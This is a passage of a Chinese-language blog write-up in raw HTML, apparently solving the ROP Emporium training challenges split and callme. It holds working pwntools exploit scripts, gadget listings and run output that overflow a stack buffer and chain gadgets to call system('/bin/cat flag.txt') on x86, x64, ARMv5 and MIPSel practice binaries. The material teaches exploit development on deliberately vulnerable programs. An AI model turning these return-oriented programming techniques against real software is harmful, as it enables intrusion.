class=\"string\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span></span><br></pre></td></tr></table></figure>\r\n<p>其中一直打印flag的原因在于使用<code>ret2win</code>地址覆盖<code>pwnme</code>函数的返回地址后，<code>ret2win</code>函数的返回地址处仍是<code>ret2win</code>的地址，导致其一直循环下去，无法退出。</p>\r\n<blockquote>\r\n<p>由于主机为x86主机，需要安装mips环境相关依赖</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">apt install qemu-user-static</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">apt install gcc-mipsel-linux-gnu</span></span><br></pre></td></tr></table></figure>\r\n</blockquote>\r\n<h2 id=\"split\">split</h2>\r\n<p>这道题目与上题的区别在于没有可直接利用的函数（单独覆盖返回地址），需要精心构造后门函数的参数才可以利用。</p>\r\n<h3 id=\"x86-1\">x86</h3>\r\n<p>漏洞函数如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [esp+0h] [ebp-28h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x60</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>后门函数如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">usefulFunction</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> system(<span class=\"string\">&quot;/bin/ls&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>但是后门函数中system函数调用的是<code>/bin/ls</code>，而不是<code>/bin/sh</code>或<code>/bin/cat flag.txt</code>，无法直接利用，需要填充system函数的参数，查看所有字符串，可以看到存在字符串<code>/bin/cat flag.txt</code>：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">.data:0804A030\t00000012\tC\t/bin/cat flag.txt</span><br></pre></td></tr></table></figure>\r\n<p>查找到system函数地址：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.plt:080483E0 ; int system(const char *command)</span><br><span class=\"line\">.plt:080483E0 _system         proc near               ; CODE XREF: usefulFunction+E↓p</span><br><span class=\"line\">.plt:080483E0</span><br><span class=\"line\">.plt:080483E0 command         = dword ptr  4</span><br><span class=\"line\">.plt:080483E0</span><br><span class=\"line\">.plt:080483E0                 jmp     ds:off_804A018</span><br><span class=\"line\">.plt:080483E0 _system         endp</span><br></pre></td></tr></table></figure>\r\n<p>将<code>/bin/cat flag.txt</code>字符串地址填充到system函数的参数地址即可。构造exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./split32&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x28</span>+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0x80483E0</span>)       <span class=\"comment\"># addr of system</span></span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)               <span class=\"comment\"># ret addr of system</span></span><br><span class=\"line\">payload += p32(<span class=\"number\">0x0804A030</span>)      <span class=\"comment\"># arg of system</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"x64-1\">x64</h3>\r\n<p>与x86类似，值得注意的是此时单个参数传递不再使用栈，而是直接利用<strong>rdi</strong>寄存器传参，因此需要将字符串地址复制到rdi寄存器中。</p>\r\n<p>漏洞函数和后门函数与上题类似：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x60</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">usefulFunction</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> system(<span class=\"string\">&quot;/bin/ls&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>查看<strong>system</strong>函数地址：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.plt:0000000000400560 ; int system(const char *command)</span><br><span class=\"line\">.plt:0000000000400560 _system         proc near               ; CODE XREF: usefulFunction+9↓p</span><br><span class=\"line\">.plt:0000000000400560                 jmp     cs:off_601020</span><br><span class=\"line\">.plt:0000000000400560 _system         endp</span><br><span class=\"line\">.plt:0000000000400560</span><br></pre></td></tr></table></figure>\r\n<p>查看字符串<code>/bin/cat flag.txt</code>地址：</p>\r\n<blockquote>\r\n<p>.data:0000000000601060 00000012 C /bin/cat flag.txt</p>\r\n</blockquote>\r\n<p>为了将字符串地址写入rdi寄存器，需要构造rop，采用ROPgadget搜索相关可用指令：</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">ROPgadget --binary ./split --only <span class=\"string\">&quot;pop|ret&quot;</span>Gadgets information</span></span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004007c0 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004007c2 : pop r15 ; ret</span><br><span class=\"line\">0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400618 : pop rbp ; ret</span><br><span class=\"line\">0x00000000004007c3 : pop rdi ; ret</span><br><span class=\"line\">0x00000000004007c1 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040053e : ret</span><br><span class=\"line\">0x0000000000400542 : ret 0x200a</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 12</span><br></pre></td></tr></table></figure>\r\n<p>可以看到 <strong>pop_rdi</strong> 的地址为<code>0x00000000004007c3</code>，因此构造exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./split&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x20</span>+<span class=\"number\">8</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0x00000000004007c3</span>)      <span class=\"comment\"># pop_rdi</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x0000000000601060</span>)      <span class=\"comment\"># /bin/cat flag.txt</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x0000000000400560</span>)      <span class=\"comment\"># system</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"armv5-1\">armv5</h3>\r\n<p>攻击原理与上类似，需要将system函数参数传递给参数寄存器（r0）。</p>\r\n<p>首先查看漏洞函数与后门函数：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">36</span>]; <span class=\"comment\">// [sp+0h] [bp-24h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, s, <span class=\"number\">0x60</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">usefulFunction</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> system(<span class=\"string\">&quot;/bin/ls&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>可以看到read函数存在缓冲区溢出，且存在system函数，地址如下所示：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.plt:000103EC                               system                                  ; CODE XREF: usefulFunction+C↓p</span><br><span class=\"line\">.plt:000103EC 00 C6 8F E2                   ADR     R12, 0x103F4</span><br><span class=\"line\">.plt:000103F0 10 CA 8C E2                   ADD     R12, R12, #0x10000</span><br><span class=\"line\">.plt:000103F4 28 FC BC E5                   LDR     PC, [R12,#(system_ptr - 0x203F4)]! ; __imp_system</span><br></pre></td></tr></table></figure>\r\n<p>但无法直接利用后门函数<code>usefulFunction</code>，需要修改system函数参数。</p>\r\n<p>然后查看可利用字符串，发现存在 <strong>/bin/cat flag.txt</strong> 字符串：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.data:0002103C\t00000012\tC\t/bin/cat flag.txt</span><br></pre></td></tr></table></figure>\r\n<p>接下来查找可利用的gadget：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary ./split_armv5 --only <span class=\"string\">&quot;mov|pop&quot;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000105e4 : mov r0, r0 ; pop &#123;fp, pc&#125;</span><br><span class=\"line\">0x00010558 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br><span class=\"line\">0x00010554 : mov r3, <span class=\"comment\">#0 ; mov r0, r3 ; pop &#123;fp, pc&#125;</span></span><br><span class=\"line\">0x0001055c : pop &#123;fp, pc&#125;</span><br><span class=\"line\">0x000103a4 : pop &#123;r3, pc&#125;</span><br><span class=\"line\">0x0001050c : pop &#123;r4, pc&#125;</span><br><span class=\"line\">0x00010644 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>\r\n<p>可以利用<code>0x000103a4</code>处的 <strong>pop {r3, pc}</strong> 指令和<code>0x00010558</code>处的 <strong>mov r0, r3 ; pop {fp, pc}</strong> 指令构造pop链，首先将<strong>/bin/cat flag.txt</strong>字符串地址<code>0x0002103C</code>弹出到 <em>r3</em> 寄存器，然后将 <em>r3</em> 寄存器复制给 <em>r0</em> 寄存器，最后将system函数地址 <code>0x000103EC</code> 弹出到到 <em>pc</em> 寄存器。编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;arm&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-arm&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/arm-linux-gnueabihf/&#x27;</span>, <span class=\"string\">&#x27;./split_armv5&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">pop_r3 = <span class=\"number\">0x000103a4</span></span><br><span class=\"line\">mov_r0_r3 = <span class=\"number\">0x00010558</span></span><br><span class=\"line\">bin_cat = <span class=\"number\">0x0002103c</span></span><br><span class=\"line\">system_addr = <span class=\"number\">0x000103EC</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(pop_r3)</span><br><span class=\"line\">payload += p32(bin_cat)</span><br><span class=\"line\">payload += p32(mov_r0_r3)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;AAAA&quot;</span></span><br><span class=\"line\">payload += p32(system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>exp运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span>: pid 17084</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\"><span class=\"built_in\">split</span> by ROP Emporium</span><br><span class=\"line\">ARMv5</span><br><span class=\"line\"></span><br><span class=\"line\">Contriving a reason to ask user <span class=\"keyword\">for</span> data...</span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br><span class=\"line\">$</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"mipsel-1\">mipsel</h3>\r\n<h4 id=\"分析\">分析</h4>\r\n<p>同样需要找到可以利用的gadget将<code>/bin/cat flag.txt</code>字符串地址传入参数寄存器 <em>a0</em>，其他步骤与x86和armv5类似。</p>\r\n<p>首先搜索相关gadget：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary ./split_mipsel --only <span class=\"string\">&quot;lw|jalr|nop&quot;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x00400638 : jalr <span class=\"variable\">$t9</span> ; nop</span><br><span class=\"line\">0x00400a20 : lw <span class=\"variable\">$a0</span>, 8(<span class=\"variable\">$sp</span>) ; lw <span class=\"variable\">$t9</span>, 4(<span class=\"variable\">$sp</span>) ; jalr <span class=\"variable\">$t9</span> ; nop</span><br><span class=\"line\">0x004007dc : lw <span class=\"variable\">$t9</span>, (<span class=\"variable\">$v0</span>) ; jalr <span class=\"variable\">$t9</span> ; nop</span><br><span class=\"line\">0x00400634 : lw <span class=\"variable\">$t9</span>, -0x7fb0(<span class=\"variable\">$gp</span>) ; jalr <span class=\"variable\">$t9</span> ; nop</span><br><span class=\"line\">0x004006d4 : lw <span class=\"variable\">$t9</span>, -0x7fb4(<span class=\"variable\">$gp</span>) ; jalr <span class=\"variable\">$t9</span> ; nop</span><br><span class=\"line\">0x00400a24 : lw <span class=\"variable\">$t9</span>, 4(<span class=\"variable\">$sp</span>) ; jalr <span class=\"variable\">$t9</span> ; nop</span><br><span class=\"line\">0x00400a1c : nop ; lw <span class=\"variable\">$a0</span>, 8(<span class=\"variable\">$sp</span>) ; lw <span class=\"variable\">$t9</span>, 4(<span class=\"variable\">$sp</span>) ; jalr <span class=\"variable\">$t9</span> ; nop</span><br><span class=\"line\">0x00400630 : nop ; lw <span class=\"variable\">$t9</span>, -0x7fb0(<span class=\"variable\">$gp</span>) ; jalr <span class=\"variable\">$t9</span> ; nop</span><br><span class=\"line\">0x00400a18 : nop ; nop ; lw <span class=\"variable\">$a0</span>, 8(<span class=\"variable\">$sp</span>) ; lw <span class=\"variable\">$t9</span>, 4(<span class=\"variable\">$sp</span>) ; jalr <span class=\"variable\">$t9</span> ; nop</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 9</span><br></pre></td></tr></table></figure>\r\n<p>分析上述gadget，可以利用<code>0x00400a20</code>处的指令进行利用，将字符串地址写入 <em>a0</em> 寄存器中，将system地址写入 <em>t9</em> 寄存器中，然后跳转到 <em>t9</em> 寄存器。由于lw指令的源地址位于栈上，需要确定栈上空间距离 <em>ra(返回地址 )</em> 偏移，因此分析pwn函数的初始和末尾指令，查看其栈布局：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:004008F4                               pwnme:</span><br><span class=\"line\">.text:004008F4                               var_28= -0x28</span><br><span class=\"line\">.text:004008F4                               var_20= -0x20</span><br><span class=\"line\">.text:004008F4                               var_s0=  0</span><br><span class=\"line\">.text:004008F4                               var_s4=  4</span><br><span class=\"line\">.text:004008F4</span><br><span class=\"line\">.text:004008F4 C0 FF BD 27                   addiu   $sp, -0x40</span><br><span class=\"line\">.text:004008F8 3C 00 BF AF                   sw      $ra, 0x38+var_s4($sp)</span><br><span class=\"line\">.text:004008FC 38 00 BE AF                   sw      $fp, 0x38+var_s0($sp)</span><br><span class=\"line\">...</span><br><span class=\"line\">.text:004009B4 3C 00 BF 8F                   lw      $ra, 0x38+var_s4($sp)</span><br><span class=\"line\">.text:004009B8 38 00 BE 8F                   lw      $fp, 0x38+var_s0($sp)</span><br><span class=\"line\">.text:004009BC 40 00 BD 27                   addiu   $sp, 0x40</span><br><span class=\"line\">.text:004009C0 08 00 E0 03                   jr      $ra</span><br><span class=\"line\">.text:004009C4 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>\r\n<p>首先分析pwnme函数的前三条指令，第一条指令将栈指针减去0x40，然后将 <em>ra</em> 寄存器值存储到 0x38+var_s4($sp) 处，将 <em>fp</em> 寄存器值存储到 0x38+var_s0($sp) 处，此时栈空间如下：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">--+-------------+-- &lt;-- $(old sp)</span><br><span class=\"line\">  + return addr +  大小：0x4</span><br><span class=\"line\">  +-------------+   &lt;-- $(old sp) - 4</span><br><span class=\"line\">  +     fp      +  大小：0x4</span><br><span class=\"line\">  +-------------+   &lt;-- $(old sp) - 8</span><br><span class=\"line\">  +             +</span><br><span class=\"line\">  +             +</span><br><span class=\"line\">  +             +\t大小：0x38</span><br><span class=\"line\">  +             +</span><br><span class=\"line\">  +-------------+   &lt;-- sp            </span><br></pre></td></tr></table></figure>\r\n<p>分析pwnme函数最后三条指令，<strong>addiu</strong> 指令将sp恢复至原位置，<strong>jr</strong> 指令跳转到返回地址（被篡改过），nop指令为延迟槽。此时栈空间如下：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">--+-------------+-- &lt;-- $sp)</span><br><span class=\"line\">  +   篡改的ra   +</span><br><span class=\"line\">  +-------------+</span><br></pre></td></tr></table></figure>\r\n<p>由于需要利用<code>0x00400a20</code>处的gadget，其 <em>a0</em> 和 <em>t9</em> 寄存器值分别来源于<code>$sp+8</code>和<code>$sp+4</code>，因此在利用缓冲区溢出写入时，需要在栈上写入如下数据：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  +  /bin/cat addr  +</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp) + 8</span><br><span class=\"line\">  +    system addr  +</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp) + 4</span><br><span class=\"line\">  +     BBBB        +</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp)</span><br><span class=\"line\">  + 0x00400a20 (ra) +</span><br><span class=\"line\">  +-----------------+</span><br></pre></td></tr></table></figure>\r\n<p>查看system函数和<code>/bin/cat flag.txt</code>字符串地址：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.MIPS.stubs:00400B70                                # int system(const char *command)</span><br><span class=\"line\">.MIPS.stubs:00400B70                               _system:                                 # DATA XREF: LOAD:00400494↑o</span><br><span class=\"line\">.MIPS.stubs:00400B70 10 80 99 8F                   lw      $t9, _GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">.MIPS.stubs:00400B74 25 78 E0 03                   move    $t7, $ra</span><br><span class=\"line\">.MIPS.stubs:00400B78 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.MIPS.stubs:00400B7C 0E 00 18 24                   li      $t8, 0xE</span><br><span class=\"line\">...</span><br><span class=\"line\">.data:00411010 2F 62 69 6E 2F 63 61 74 20 66+usefulString:.ascii &quot;/bin/cat flag.txt&quot;&lt;0&gt;</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"编写exp\">编写exp</h4>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;mips&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-mipsel&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class=\"string\">&#x27;./split_mipsel&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">bin_cat = <span class=\"number\">0x00411010</span></span><br><span class=\"line\">system_addr = <span class=\"number\">0x00400B70</span></span><br><span class=\"line\">lw_a0_t9_jalr = <span class=\"number\">0x00400a20</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(lw_a0_t9_jalr)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">payload += p32(system_addr)</span><br><span class=\"line\">payload += p32(bin_cat)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"exp运行结果\">exp运行结果</h4>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-mipsel&#x27;</span>: pid 19304</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\"><span class=\"built_in\">split</span> by ROP Emporium</span><br><span class=\"line\">MIPS</span><br><span class=\"line\"></span><br><span class=\"line\">Contriving a reason to ask user <span class=\"keyword\">for</span> data...</span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"callme\">callme</h2>\r\n<p>这道题考的是如何构造函数调用链以达到解密flag的思路。</p>\r\n<h3 id=\"x86-2\">x86</h3>\r\n<p>题目解压后出现5个附件，经分析，对flag进行了逐步加密，并写入了<code>encrypted_flag.dat</code>文件中，需要对该过程进行逆向，逐步还原flag，首先查看题目代码：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [esp+0h] [ebp-28h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Hope you read the instructions...\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x200</span>u);\t\t\t<span class=\"comment\">// 溢出</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>同时题目中提示userfulFunction：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __noreturn <span class=\"title function_\">usefulFunction</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  callme_three(<span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>);</span><br><span class=\"line\">  callme_two(<span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>);</span><br><span class=\"line\">  callme_one(<span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>但这三个函数均位于<code>libcallme32</code>动态链接库中，查看动态链接库中的函数：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">callme_one</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">int</span> a2, <span class=\"type\">int</span> a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 != <span class=\"number\">-559038737</span> || a2 != <span class=\"number\">-889275714</span> || a3 != <span class=\"number\">-804392947</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Incorrect parameters&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  stream = fopen(<span class=\"string\">&quot;encrypted_flag.dat&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;unk_A00);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  g_buf = (<span class=\"type\">int</span>)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x21</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !g_buf )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Could not allocate memory&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  g_buf = (<span class=\"type\">int</span>)fgets((<span class=\"type\">char</span> *)g_buf, <span class=\"number\">33</span>, stream);</span><br><span class=\"line\">  fclose(stream);</span><br><span 